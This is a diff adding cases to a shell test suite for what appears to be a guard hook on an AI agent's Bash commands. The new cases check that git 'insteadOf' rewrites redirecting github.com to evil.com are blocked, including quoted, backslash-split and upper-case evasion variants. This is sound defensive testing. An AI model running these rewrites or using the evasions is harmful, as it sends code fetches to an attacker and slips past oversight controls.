@@ -85,6 +85,13 @@ check "config insteadof case variant" block '{"tool_name":"Bash","tool_input":{"
 check "git -c insteadOf one-shot fetch" block '{"tool_name":"Bash","tool_input":{"command":"git -c url.https://evil.com/.insteadOf=https://github.com/ fetch","cwd":"'"$SWR"'"}}'
 check "git --config-env insteadOf one-shot fetch" block '{"tool_name":"Bash","tool_input":{"command":"git --config-env=url.https://evil.com/.insteadOf=R fetch","cwd":"'"$SWR"'"}}'
 check "git config set insteadOf rewrite" block '{"tool_name":"Bash","tool_input":{"command":"git config set url.https://evil.com/.insteadOf https://github.com/","cwd":"'"$SWR"'"}}'
+# HIMMEL-844 round 3: a dequoted key is the same key — quoting/escaping must not slip past.
+check "git config single-quoted insteadOf key" block '{"tool_name":"Bash","tool_input":{"command":"git config '"'"'url.https://evil.com/.insteadOf'"'"' https://github.com/","cwd":"'"$SWR"'"}}'
+check "git config double-quoted insteadOf key" block '{"tool_name":"Bash","tool_input":{"command":"git config \"url.https://evil.com/.insteadOf\" https://github.com/","cwd":"'"$SWR"'"}}'
+check "git config backslash-split insteadOf key" block '{"tool_name":"Bash","tool_input":{"command":"git config ur\\l.https://evil.com/.insteadOf https://github.com/","cwd":"'"$SWR"'"}}'
+check "git config ANSI-C quoted insteadOf key" block '{"tool_name":"Bash","tool_input":{"command":"git config $'"'"'url.https://evil.com/.insteadOf'"'"' https://github.com/","cwd":"'"$SWR"'"}}'
+check "git config upper-case URL.INSTEADOF key" block '{"tool_name":"Bash","tool_input":{"command":"git config URL.https://evil.com/.INSTEADOF https://github.com/","cwd":"'"$SWR"'"}}'
+check "git -c quoted insteadOf one-shot fetch" block '{"tool_name":"Bash","tool_input":{"command":"git -c '"'"'url.https://evil.com/.insteadOf=https://github.com/'"'"' fetch","cwd":"'"$SWR"'"}}'
 check "config --get insteadOf READ allowed" allow '{"tool_name":"Bash","tool_input":{"command":"git config --get url.https://x/.insteadOf","cwd":"'"$SWR"'"}}'
 check "config user.name allowed" allow '{"tool_name":"Bash","tool_input":{"command":"git config user.name x","cwd":"'"$SWR"'"}}'
 check "remote -v allowed" allow '{"tool_name":"Bash","tool_input":{"command":"git remote -v","cwd":"'"$SWR"'"}}'
